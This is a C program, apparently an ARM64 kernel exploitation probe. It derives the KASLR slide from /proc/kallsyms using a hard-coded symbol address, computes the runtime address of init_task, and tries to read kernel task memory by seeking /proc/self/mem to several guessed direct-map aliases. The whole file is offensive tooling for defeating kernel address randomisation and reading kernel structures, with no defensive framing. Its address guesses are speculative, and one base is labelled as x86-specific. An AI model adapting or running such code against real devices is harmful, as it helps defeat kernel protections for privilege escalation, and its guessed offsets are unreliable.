// scan_direct.c - Scan init_task using direct-mapped address
// On ARM64, direct map (linear mapping) starts at PAGE_OFFSET
// Direct map address = virt - PAGE_OFFSET + phys_base
// But we can try reading via /proc/self/mem at the direct map address

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

// Try to find direct-map alias for kernel address
// Linear mapping: 0xffff000000000000 to 0xffff100000000000 (64TB)
// Kernel image: 0xffffff8008000000 to 0xffffff8010000000 (192MB)

int main(void) {
    // Get slide from kallsyms
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (!ks) { perror("kallsyms"); return 1; }
    
    uint64_t perf_static  = 0xffffff80081f2f74ULL;
    uint64_t perf_runtime = 0;
    uint64_t slide = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), ks)) {
        uint64_t addr; char type[4], name[128];
        if (sscanf(line, "%lx %s %s", &addr, type, name) == 3) {
            if (strcmp(name, "perf_event_init_task") == 0 && addr != 0) {
                perf_runtime = addr;
                slide = perf_runtime - perf_static;
                break;
            }
        }
    }
    fclose(ks);
    
    printf("[*] slide = %lx\n", slide);
    
    uint64_t init_task_static  = 0xffffff800957b6c0ULL;
    uint64_t init_task_runtime = init_task_static + slide;
    printf("[*] init_task runtime = %lx\n", init_task_runtime);
    
    // Try direct-map alias
    // On ARM64 with KASLR, the direct map is at a fixed offset from kernel text
    // Try common direct-map bases
    
    uint64_t direct_bases[] = {
        0xffff888000000000ULL,  // Common x86_64 (probably not on ARM64)
        0xffff000000000000ULL,  // ARM64 linear start
        init_task_runtime & 0xffff8fffffffffffULL,  // Try stripping kernel bit
        0xffffff8000000000ULL + slide,  // Kernel data base + slide
    };
    
    int fd = open("/proc/self/mem", O_RDONLY);
    if (fd < 0) { perror("mem"); return 1; }
    
    for (int b = 0; b < 4; b++) {
        uint64_t try_addr = direct_bases[b] + (init_task_runtime & 0x7ffffffULL);
        printf("[*] Trying direct-map alias: %lx\n", try_addr);
        
        uint64_t buf[16];
        lseek(fd, try_addr, SEEK_SET);
        ssize_t got = read(fd, buf, 128);
        
        if (got > 0) {
            printf("[+] Read succeeded! Got %zd bytes\n", got);
            for (int i = 0; i < 16; i++) {
                if (buf[i] != 0) {
                    printf("  +%03x: %lx\n", i*8, buf[i]);
                }
            }
            break;
        }
    }
    
    close(fd);
    return 0;
}
